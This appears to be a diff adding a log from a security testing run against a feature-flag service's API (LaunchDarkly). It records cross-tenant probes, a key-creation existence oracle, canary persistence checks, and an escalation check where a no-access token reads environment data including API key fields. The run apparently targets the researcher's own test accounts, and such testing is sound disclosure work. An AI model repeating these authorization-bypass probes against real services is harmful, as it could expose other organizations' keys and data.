@@ -1,0 +1,29 @@
+==========================================================================
+R10 HUNT 7 — decisive controls
+==========================================================================
+
+--- A. TST project list (does TST own a 'default' project?) ---
+[TST] projects: 200 {"_links":{"self":{"href":"/api/v2/projects?limit=20","type":"application/json"}},"items":[{"_links":{"environments":{"href":"/api/v2/projects/zenovictimproj/environments","type":"application/json"},"flagDefaults":{"href":"/api/v2/projects/zenovictimproj/flag-defaults","type":"application/json"},"self":{"href":"/api/v2/projects/zenovictimproj","type":"application/json"}},"_id":"6ada0cce6f9f4507ca1c771e","key":"zenovictimproj","includeInSnippetByDefault":false,"requireViewAssociationForNewFlags":false,"requireViewAssociationForNewSegments":false,"requireTeamMaintainerForNewFlags":false,"defaultClientSideAvailability":{"usingMobileKey":true,"usingEnvironmentId":false},"name":"zenovictimproj","
+[TST] project keys: ['zenovictimproj', 'default']
+
+--- B. ORG project list (baseline keys) ---
+[ORG] 200 project keys: ['zxorg-proj-7f3a', 'default']
+
+--- C. keypair existence oracle: TST + bogus projectKey ---
+[TST bogus] 201 {"public_key":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC4OKWTb+XrgUc0/7GeMlv4sCUIIN70OGcQsLSMc5pQDs4JXpSbvBVyXB6jtNGhIRoUIWmxOUjWY+GLt6sM7CGzU1P76dwIIDL6R4eLQYv/CFcJ0F0dgg6FSlOyTH9sL0lg440gYtd6Xh6ROjn6E
+
+--- D. repeat TST + ORG default (confirm reproducibility) ---
+[TST + ORG default again] 201 {"public_key":"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChT1JxlhyxTsNXn0/uvMVYdlsq/woGxtuLh7h4YpdXWF0D49lT8ALQoGGEY6yuh3UES
+
+--- E. persistence check: ORG destinations count before/after (canaries!) ---
+[ORG] destinations count=2 ids=['6ada7183022a1f07bba87677', '6ada7186987d6c07b3cdce35']
+[TST] destinations count=0 ids=[]
+
+--- F. FINDING_002 escalation: no_access token reads environments (SDK keys?) ---
+[NA] default/environments: 200 apiKey_field=True {"_links":{"parent":{"href":"/api/v2/projects/default","type":"application/json"},"self":{"href":"/api/v2/projects/default/environments?limit=20","type":"application/json"}},"totalCount":2,"items":[{"_links":{"analytics":{"href":"https://app.launchdarkly.com/s
+[NA] zxorg-proj-7f3a/environments: 200 apiKey_field=True {"_links":{"parent":{"href":"/api/v2/projects/zxorg-proj-7f3a","type":"application/json"},"self":{"href":"/api/v2/projects/zxorg-proj-7f3a/environments?limit=20","type":"application/json"}},"totalCount":2,"items":[{"_links":{"analytics":{"href":"https://app.la
+[M-owner control] 200 apiKey_field=True
+
+--- G. no_access token reads /internal/list/environments (tokens get legacy fence?) ---
+[NA] internal/list/environments: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+DONE
